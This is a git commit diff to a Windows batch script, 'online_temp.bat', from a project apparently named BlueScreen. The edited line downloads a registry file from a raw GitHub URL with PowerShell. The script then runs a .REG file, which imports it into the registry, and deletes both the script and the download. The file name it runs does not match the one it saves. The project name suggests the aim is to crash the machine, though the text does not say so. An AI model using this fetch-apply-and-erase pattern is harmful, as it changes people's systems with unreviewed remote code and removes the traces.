74eec0e8a04f7be4c6cec1d1cdcdde070904e1c5
Bluescreen <148587892+ProjectBluescreen@users.noreply.github.com>
2024-02-12 19:42:05 -0500

    Update online_temp.bat

--- online_temp.bat
+++ online_temp.bat
@@ -5,7 +5,7 @@ pause
 pause
 pause
 pause
-powershell /c Invoke-WebRequest https://raw.githubusercontent.com/ProjectBluescreen/BlueScreen/main/online_temp.REG -OutFile temp.REG
+powershell /c Invoke-WebRequest https://raw.githubusercontent.com/ProjectBluescreen/BlueScreen/main/temp.REG -OutFile temp.REG
 online_temp.REG
 del online_bluescreen.bat
 del temp.REG
